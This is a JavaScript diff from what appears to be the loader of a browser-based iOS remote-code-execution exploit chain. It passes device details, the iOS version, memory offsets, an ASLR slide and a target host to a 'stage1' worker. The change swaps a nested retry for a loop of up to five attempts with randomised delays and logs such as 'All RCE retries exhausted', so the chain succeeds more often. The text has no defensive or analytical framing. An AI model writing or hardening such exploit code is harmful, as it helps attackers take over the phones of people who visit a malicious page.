@@ -2,6 +2,7 @@ var SERVER_LOG = true;
 let logStart = new Date().getTime();
 let logEntryID = 0;
 var offsets = {};
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 var slide;
 var chipset;
 var device_model;
@@ -208,33 +209,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             else 
             {
         var attempt = new check_attempt();
-        attempt.start().then((result) => {
-            if(!result)
-            {
-               // print("Retrying");
-                attempt.start().then((result) => {
-                    if(!result)
-                       print("");
-                    else
-                            {
-                        worker.postMessage({
-                        type: 'stage1',
-                        begin,
-                        origin,
-                        ios_version,
-                        offsets,
-                        slide,
-                        chipset,
-                        device_model,
-                        desiredHost,
-                        SERVER_LOG
-                });
-                            }
-                        });
-                    }
-                    else
-                    {
-                        //WebViewComptability(attempt, iframe);
+        var startStage1 = (result) => {
+            if(!result) { print("Retrying"); return false; }
             worker.postMessage({
                 type: 'stage1',
                 begin,
@@ -247,13 +223,23 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 desiredHost,
                 SERVER_LOG
             });
-                    }
+            return true;
+        };
+        var tryChain = (depth) => {
+            return attempt.start().then((result) => {
+                if (startStage1(result)) return true;
+                if (depth <= 0) { print("All RCE retries exhausted"); return false; }
+                return sleep(700 + Math.random()*900).then(() => tryChain(depth - 1));
+            });
+        };
+        tryChain(5).then((ok) => {
+            if(!ok) { print("chain failed after retries"); }
         });
             }
         }
         catch(e)
         {
-       // print("Got exception on something: " + e);
+            print("Got exception in main: " + e);
         }
     }
     main();
